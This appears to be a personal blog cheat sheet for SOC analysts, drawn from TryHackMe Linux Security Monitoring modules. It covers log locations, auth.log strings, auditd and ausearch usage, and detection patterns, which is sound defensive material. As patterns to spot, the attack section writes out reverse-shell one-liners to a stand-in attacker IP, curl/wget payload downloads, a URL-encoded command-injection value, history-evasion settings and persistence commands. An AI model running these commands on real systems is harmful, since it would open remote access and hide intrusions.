---
title: Linux Security Monitoring Cheat Sheet
description: Quick reference of Linux log files, auditd syscalls and ausearch filters, process tree analysis, and Threat Detection patterns from the Linux Security Monitoring module.
pubDate: 2026-11-03
categories:
  - SOC
  - Walkthrough
  - TryHackMe
  - Network
tags:
  - Lessons
image: /image/networksecess.png
---
---
## Summary

This is a personal cheat sheet and quick reference covering the core Linux log locations, `auditd` record types and `ausearch` commands, process tree reconstruction techniques, and threat detection patterns from the **Linux Security Monitoring** module on TryHackMe (`Linux Logging for SOC`, `Linux Threat Detection 1`, `Linux Threat Detection 2`, and `Linux Threat Detection 3`).

---

## 1. Key Linux Log Sources & File Locations

On Debian/Ubuntu-based systems, standard text and binary logs live inside **`/var/log/`**. When triaging a Linux host, these are the primary log sources to check:

| Log Source | Default File Path | Format | What It Captures |
| :--- | :--- | :--- | :--- |
| **System Log (`rsyslog`)** | `/var/log/syslog` (or `/var/log/messages` on RHEL) | Plaintext | System-wide service status, `cron` job executions, `systemd` unit starts (`Started ...`), kernel events, and network daemon logs. |
| **Authentication Log** | `/var/log/auth.log` (or `/var/log/secure` on RHEL) | Plaintext | SSH logins (`Accepted`/`Failed`), `sudo` command execution, `su` user switches, and local account/group changes (`useradd`, `usermod`, `passwd`). |
| **Linux Audit Daemon (`auditd`)** | `/var/log/audit/audit.log` | Key-Value / Hex | Kernel-level syscall telemetry (`execve`, `openat`, `connect`), full command arguments, `PID`/`PPID` relationships, `uid`/`euid` context, and file modifications. |
| **Package Manager Log** | `/var/log/dpkg.log` (`apt` history in `/var/log/apt/history.log`) | Plaintext | Every package installation (`status installed`), upgrade, or removal on Debian/Ubuntu hosts. |
| **Web Server Logs** | `/var/log/nginx/access.log` & `error.log` (or `/var/log/apache2/`) | Plaintext | HTTP requests, client IPs, User-Agents, status codes, and URL query strings (critical for spotting web attacks and command injection). |
| **Login Session Logs** | `/var/log/wtmp`, `/var/log/btmp`, `/var/log/lastlog` | Binary | Historical logins (`last` reads `wtmp`), failed login attempts (`lastb` reads `btmp`), and most recent login per user (`lastlog`). |
| **Shell History** | `/home/<user>/.bash_history`, `/root/.bash_history` | Plaintext | Commands typed interactively by a user (written when the shell exits cleanly; easily bypassed with `HISTFILE=/dev/null` or `unset HISTFILE`). |

---

## 2. Authentication & Account Patterns (`/var/log/auth.log`)

When reviewing `/var/log/auth.log` (or querying `journalctl -u ssh`), these log strings tell you exactly what happened during authentication and privilege management:

| Event Category | Pattern to `grep` in `/var/log/auth.log` | Key Details & SOC Notes |
| :--- | :--- | :--- |
| **SSH Password Login (Success)** | `Accepted password for <user> from <IP> port <port> ssh2` | Standard interactive password login. If preceded by hundreds of `Failed password` lines from the same IP, it indicates a successful **SSH brute-force** attack. |
| **SSH Public Key Login (Success)** | `Accepted publickey for <user> from <IP> port <port> ssh2: RSA SHA256:<fingerprint>` | Passwordless SSH key login. Check the key fingerprint against known `authorized_keys` entries (`ssh-keygen -lf ~/.ssh/authorized_keys`). |
| **SSH Failed Password** | `Failed password for <user> from <IP> port <port> ssh2` | Invalid password for an existing user. |
| **SSH Invalid User** | `Failed password for invalid user <user> from <IP>` (or `Invalid user <user>`) | Attacker guessing usernames that do not exist on the host (common in automated SSH dictionary scans). |
| **Sudo Command Execution** | `sudo: <user> : TTY=pts/0 ; PWD=... ; USER=root ; COMMAND=/bin/...` | Shows which user ran `sudo`, their working directory (`PWD`), target user (`USER=root`), and the exact command executed. |
| **Switch User (`su`)** | `pam_unix(su:session): session opened for user <target> by <user>(uid=...)` | Tracks lateral user switching inside a terminal session. |
| **New User Created** | `useradd[...]: new user: name=<user>, UID=<uid>, GID=<gid>, home=...` | Catch local backdoor users being created. |
| **Group Membership Change** | `usermod[...]: add '<user>' to group 'sudo'` (or `gpasswd`) | High-severity alert: newly created or low-privileged user granted full `sudo` (root) privileges. |

---

## 3. Linux Audit Daemon (`auditd`) & `ausearch` Cheat Sheet

Unlike `.bash_history`, **`auditd`** hooks directly into the Linux kernel to log system calls (`syscalls`) regardless of whether a command was run via an interactive shell, a web shell, a reverse shell, or a `cron` job.

### Essential `ausearch` Flags
Always pass **`-i` (`--interpret`)** so `ausearch` translates numeric UIDs into usernames, hex-encoded `proctitle`/`execve` strings into readable ASCII text, and epoch timestamps into human-readable dates:

```bash
# Search all events in the default audit log and interpret hex/UIDs
sudo ausearch -i

# Read from a specific offline or rotated audit.log file
ausearch -i -if /var/log/audit/audit.log

# Filter by audit rule key (-k) defined in /etc/audit/rules.d/
ausearch -i -k process
ausearch -i -k exec_curl

# Trace a specific Process ID (--pid) or all child processes of a Parent PID (--ppid)
ausearch -i --pid 1835
ausearch -i --ppid 1072

# Search by executable name (-x) or file path (-f)
ausearch -i -x curl
ausearch -i -f /etc/sudoers
ausearch -i -f /var/spool/cron/crontabs/

# Filter by audit record type (-m) or syscall (-sc)
ausearch -i -m EXECVE
ausearch -i -m PROCTITLE
ausearch -i -sc connect
```

### Core `auditd` Record Types & Fields
A single event in `audit.log` shares the same **event ID** (`msg=audit(epoch_timestamp:event_id):`) across multiple lines (`type=...`):

| Record `type` | Key Fields | What It Tells You |
| :--- | :--- | :--- |
| **`SYSCALL`** | `syscall=execve` (or `openat`, `connect`), `success=yes`, `pid=`, `ppid=`, `auid=` (original login UID), `uid=`, `euid=` (effective UID), `tty=`, `comm=`, `exe=`, `key=` | The anchor record for every event. Shows who ran the syscall (`uid`/`euid`), which binary was invoked (`exe`), its `pid`, and its parent process (`ppid`). **Tip:** If `uid != euid` (e.g., `uid=ubuntu` and `euid=root` without `sudo`), check if the binary (`exe`) is a **SUID** binary exploited for privilege escalation! |
| **`EXECVE`** | `argc=`, `a0=`, `a1=`, `a2=...` | Records the exact command-line arguments passed to an `execve` syscall. |
| **`PROCTITLE`** | `proctitle=...` | Full command line of the process (stored in hexadecimal in raw `audit.log` to preserve spaces and special characters; decoded automatically by `ausearch -i`). |
| **`CWD`** | `cwd="/path/to/dir"` | The current working directory from which the process was executed. |
| **`PATH`** | `item=0`, `name="/path/to/file"`, `inode=`, `mode=` | File paths accessed, created, or executed during the syscall. |
| **`SOCKADDR`** | `saddr={ lfamily=inet laddr=<IP> lport=<port> }` | Network socket destination IP (`laddr`) and port (`lport`) when auditing `connect` syscalls (great for catching C2 callbacks and reverse shells). |

---

## 4. Attack Scenarios & Investigation Patterns (Module Recap)

### A. Initial Access (`Linux Threat Detection 1`)
1. **SSH Brute Force vs. Stolen SSH Key**:
   - Check `/var/log/auth.log` for `Failed password` floods followed by `Accepted password` (brute force) vs. immediate `Accepted publickey` (compromised private key or backdoor `authorized_keys`).
2. **Web Application Command Injection**:
   - Check `/var/log/nginx/access.log` for URL-encoded shell metacharacters (`%3B` = `;`, `%7C` = `|`, `%26%26` = `&&`, `%20` = space) appended to parameters like `?domain=google.com%3Bwhoami`.
   - Reconstruct the process tree in `auditd`: find the web app worker PID (`python3 app.py` or `php-fpm` / `www-data`), then run `ausearch -i --ppid <PID>` to trace every `sh -c ...` command spawned by the vulnerability.

### B. Discovery, Ingress Tool Transfer & Cryptominers (`Linux Threat Detection 2`)
1. **Post-Compromise Automated Discovery**:
   - When a wave of discovery commands (`uname -a`, `whoami`, `id`, `cat /etc/issue`, `systemd-detect-virt`, `lscpu`, `ps aux`) runs within the exact same second (`00` seconds difference), it indicates a **scripted/automated enumeration payload** rather than manual typing.
   - Look for `ps aux | egrep "falcon|crowdstrike|nessus|cynet|..."` checking for installed EDR/AV agents.
2. **Ingress Tool Transfer (`curl` vs. `wget`)**:
   - Attackers commonly pull payloads with `curl -O http://...` or `wget http://... -O /tmp/...`.
   - **Browser User-Agent Spoofing**: Malware scripts often pass `curl -A "Mozilla/5.0 ..."` or `wget -U "Mozilla/5.0 ..."` to blend in with normal browser traffic on network proxies.
3. **Cryptominer Staging (e.g., `Dota3`)**:
   - Look for archives downloaded and unpacked into masqueraded hidden folders in `/tmp` or `/var/tmp` (such as `mkdir /tmp/.apt` and `tar -xvf /tmp/dota3.tar.gz -C /tmp/.apt/`).

### C. Reverse Shells, Privilege Escalation & Persistence (`Linux Threat Detection 3`)
1. **Reverse Shells**:
   - Common one-liners seen in `PROCTITLE` / `EXECVE`:
     - `socat TCP:<Attacker_IP>:<Port> EXEC:/bin/sh`
     - `bash -i >& /dev/tcp/<Attacker_IP>/<Port> 0>&1`
     - `python3 -c 'import socket,subprocess,os; ...'`
   - Always check `tty=(none)` and trace `--ppid` back to the initial service (`www-data`, `wordpress`, etc.) that spawned the shell.
2. **Credential Hunting & Privilege Escalation**:
   - **Password Hunting**: Look for recursive `grep` commands in `auditd` (`grep -iR pass .`, `grep -rnw '/var/www/' -e 'password'`) followed by `su <user>` in `/var/log/auth.log`.
   - **SUID Binaries**: Look for `find / -perm -u=s -type f 2>/dev/null` (or `-perm -4000`), followed by an `auditd` `SYSCALL` record where `uid=<low_priv_user>` and `euid=root` via an unusual binary (`exe=/usr/bin/find`, `vim`, `python3`, `bash -p`).
3. **Four Core Linux Persistence Mechanisms**:
   - **Cron Jobs**: Check `/etc/crontab`, `/etc/cron.*/*`, and per-user crontabs in `/var/spool/cron/crontabs/<user>` (`ausearch -i -f /var/spool/cron/crontabs/`). Look for `@reboot` entries or `* * * * *` reverse shells.
   - **Systemd Services**: Check `/etc/systemd/system/<name>.service` for newly created unit files (`ExecStart=/bin/bash -c ...`) and `/var/log/syslog` for `Started <service>`.
   - **Backdoor `sudo` Account**: Check `/var/log/auth.log` for `useradd` followed by `usermod -aG sudo <user>` or edits to `/etc/sudoers`.
   - **SSH `authorized_keys`**: Check `ausearch -i -f .ssh/authorized_keys` for attackers appending their own SSH public key (`echo "ssh-rsa ..." >> ~/.ssh/authorized_keys`) to maintain quiet passwordless access.
   - **Shell Startup Profiles**: Check `~/.bashrc`, `~/.profile`, and `/etc/profile` for appended payload commands that trigger whenever a user opens a terminal.
